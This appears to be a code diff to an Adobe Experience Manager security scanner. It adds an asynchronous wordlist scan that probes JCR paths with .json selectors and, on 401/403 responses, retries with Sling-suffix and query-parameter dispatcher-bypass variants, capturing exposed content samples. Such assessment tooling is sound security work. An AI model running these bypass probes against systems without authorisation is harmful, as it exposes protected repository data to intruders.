@@ -5,11 +5,14 @@ import re
 from typing import List, Dict, Optional, Any
 from dataclasses import dataclass
 
+import asyncio
+
 from core.models import Finding, VulnSeverity, ScanPhase, BypassTechnique
 from core.config import AEMConfig
 from core.engine import HTTPXEngine
 from core.phases import PhaseResult
 from bypass.transformers import BypassTransformer
+from data.wordlists import AEMWordlists
 
 
 @dataclass
@@ -79,6 +82,11 @@ class JCRProbingModule:
         for path in self.CRITICAL_PATHS:
             path_findings = await self._probe_path(base_url, path)
             _dedup_extend(path_findings)
+        
+        # Wordlist-driven scan — tests ALL CORE_PATHS with .json and
+        # applies bypass variants (suffix, query param) on 403-blocked paths
+        wordlist_findings = await self._scan_wordlist_paths(base_url, seen_urls)
+        _dedup_extend(wordlist_findings)
         
         # Check for sensitive data exposure
         sensitive_findings = await self._check_sensitive_exposure(base_url)
@@ -258,6 +266,149 @@ class JCRProbingModule:
         if path in ("/", "/content", "/content/dam", "/etc"):
             return VulnSeverity.HIGH
         return VulnSeverity.MEDIUM
+    
+    async def _scan_wordlist_paths(self, base_url: str, already_seen: set) -> List[Finding]:
+        """Scan ALL wordlist CORE_PATHS with .json and bypass variants.
+        
+        Strategy:
+        - Test each path with .json directly
+        - If 200 + valid JCR content → report as DefaultGetServlet finding
+        - If 403 → try bypass variants (suffix, query param) to defeat dispatcher
+        - Skip 404s (path doesn't exist)
+        
+        Uses concurrency semaphore to avoid overwhelming the target.
+        """
+        findings = []
+        sem = asyncio.Semaphore(min(15, self.config.max_concurrent))
+        
+        # Bypass variants to try on 403-blocked paths
+        bypass_variants = [
+            ("/ck.css",   BypassTechnique.SLING_SUFFIX,    "Sling suffix .css"),
+            ("/ck.html",  BypassTechnique.SLING_SUFFIX,    "Sling suffix .html"),
+            ("/ck.png",   BypassTechnique.SLING_SUFFIX,    "Sling suffix .png"),
+            ("/ck.ico",   BypassTechnique.SLING_SUFFIX,    "Sling suffix .ico"),
+            ("?ck.css",   BypassTechnique.QUERY_EXTENSION, "Query param .css"),
+            ("?ck.png",   BypassTechnique.QUERY_EXTENSION, "Query param .png"),
+            ("?ck.html",  BypassTechnique.QUERY_EXTENSION, "Query param .html"),
+            ("?ck.ico",   BypassTechnique.QUERY_EXTENSION, "Query param .ico"),
+        ]
+        
+        # Selectors to try on each path
+        selectors = [".json", ".children.json", ".1.json"]
+        
+        # Deduplicate against paths already tested in DGS enumeration
+        wordlist_paths = [
+            p for p in AEMWordlists.CORE_PATHS
+            if f"{base_url}{p}.json" not in already_seen
+        ]
+        
+        async def _test_path(path: str):
+            path_findings = []
+            async with sem:
+                for selector in selectors:
+                    endpoint = f"{path}{selector}"
+                    url = f"{base_url}{endpoint}"
+                    
+                    if url in already_seen:
+                        continue
+                    
+                    resp = await self.engine.get(url)
+                    
+                    if resp.status_code == 200 and not resp.is_soft_404 and self._is_valid_dgs_response(resp.text):
+                        path_findings.append(Finding(
+                            phase=ScanPhase.DISCOVERY,
+                            technique="DefaultGetServlet",
+                            url=url,
+                            severity=self._dgs_severity(path, selector),
+                            title=f"DefaultGetServlet: {endpoint}",
+                            description=f"Sensitive information exposed via DefaultGetServlet at {endpoint}",
+                            evidence={
+                                "path": path,
+                                "selector": selector,
+                                "response_size": len(resp.text),
+                                "sample": resp.text[:300],
+                                "source": "wordlist",
+                            },
+                            chainable=True
+                        ))
+                        # Found working selector on this path — try bypass
+                        # variants so we report each unique bypass route
+                        for bsuffix, technique, desc in bypass_variants:
+                            bypass_url = f"{base_url}{endpoint}{bsuffix}"
+                            if bypass_url in already_seen:
+                                continue
+                            
+                            bresp = await self.engine.get(bypass_url)
+                            if (bresp.status_code == 200
+                                    and not bresp.is_soft_404
+                                    and self._is_valid_dgs_response(bresp.text)):
+                                path_findings.append(Finding(
+                                    phase=ScanPhase.DISCOVERY,
+                                    technique="DefaultGetServlet",
+                                    url=bypass_url,
+                                    severity=self._dgs_severity(path, selector),
+                                    title=f"DefaultGetServlet: {endpoint}{bsuffix}",
+                                    description=f"DefaultGetServlet exposed via {desc} at {endpoint}",
+                                    evidence={
+                                        "path": path,
+                                        "selector": selector,
+                                        "bypass": bsuffix,
+                                        "bypass_type": desc,
+                                        "response_size": len(bresp.text),
+                                        "sample": bresp.text[:300],
+                                        "source": "wordlist",
+                                    },
+                                    bypass_used=technique,
+                                    chainable=True
+                                ))
+                        # Stop testing more selectors on this path (one is enough)
+                        break
+                    
+                    elif resp.status_code in [401, 403]:
+                        # Path exists but is blocked — try bypass variants
+                        for bsuffix, technique, desc in bypass_variants:
+                            bypass_url = f"{base_url}{endpoint}{bsuffix}"
+                            if bypass_url in already_seen:
+                                continue
+                            
+                            bresp = await self.engine.get(bypass_url)
+                            if (bresp.status_code == 200
+                                    and not bresp.is_soft_404
+                                    and self._is_valid_dgs_response(bresp.text)):
+                                path_findings.append(Finding(
+                                    phase=ScanPhase.DISCOVERY,
+                                    technique="DefaultGetServlet",
+                                    url=bypass_url,
+                                    severity=VulnSeverity.HIGH,
+                                    title=f"Dispatcher Bypass: {endpoint}{bsuffix}",
+                                    description=f"Blocked path {endpoint} accessible via {desc}",
+                                    evidence={
+                                        "path": path,
+                                        "selector": selector,
+                                        "bypass": bsuffix,
+                                        "bypass_type": desc,
+                                        "original_status": resp.status_code,
+                                        "response_size": len(bresp.text),
+                                        "sample": bresp.text[:300],
+                                        "source": "wordlist",
+                                    },
+                                    bypass_used=technique,
+                                    chainable=True
+                                ))
+                        # One blocked selector is enough to trigger bypasses
+                        break
+            
+            return path_findings
+        
+        # Run all path tests with concurrency
+        tasks = [_test_path(p) for p in wordlist_paths]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        for result in results:
+            if isinstance(result, list):
+                findings.extend(result)
+        
+        return findings
     
     async def _test_selectors(self, base_url: str) -> List[Finding]:
         """Test dangerous selectors on various paths."""
